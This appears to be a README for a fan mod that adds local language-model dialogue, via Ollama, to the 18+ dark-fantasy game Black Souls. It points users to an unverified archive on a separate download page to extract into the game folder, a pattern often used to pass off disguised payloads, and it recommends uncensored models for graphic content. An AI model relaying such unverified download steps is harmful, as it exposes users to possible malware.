## About

**Black Souls — AI Edition** drops a local language model into a Wonderland that went wrong a long time ago. Alice is not a child, the fairy tales are all corpses of themselves, and the game's grim arithmetic of love and consumption runs underneath every conversation.

The AI plays the Alices and the storybook cast with the source material's specific tone: baroque, cruel, and occasionally, briefly, tender.

> 🖤 The mod tracks who you have devoured and who you have spared. The cast knows. They bring it up.

## ✨ Features

- 📕 **Fairy tale roster** — Each corrupted story figure written as a distinct persona.
- 🍽️ **Devour tracking** — A persistent record of your choices that alters how the cast treats you.
- ⚔️ **Battle dialogue** — Combat encounters with in-character taunts and negotiation.
- 🌑 **Tone-locked prompts** — Prose tuned to the game's ornate, unpleasant register.
- 🔒 **Runs on your machine** — No cloud service is going to touch this content anyway.
- 🎭 **Portrait integration** — Character art swaps with detected emotional state.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Black Souls

1. Start from a clean, working installation of **Black Souls**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## 🎯 Descending

1. Uncensored models handle this game's content far more coherently than filtered ones.
2. Devour tracking is persistent by design. Delete the file if you want a clean Wonderland.
3. Ornate prose needs room — bump the response length limit up from the default.

## ❓ FAQ

**Q: Content warnings?**
> Extensive. Black Souls is an 18+ dark fantasy with graphic violence and sexual content.

**Q: Does it need the fan translation?**
> The English patched build is the supported target.

**Q: Will it break my save?**
> No. The mod writes only to its own folder.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
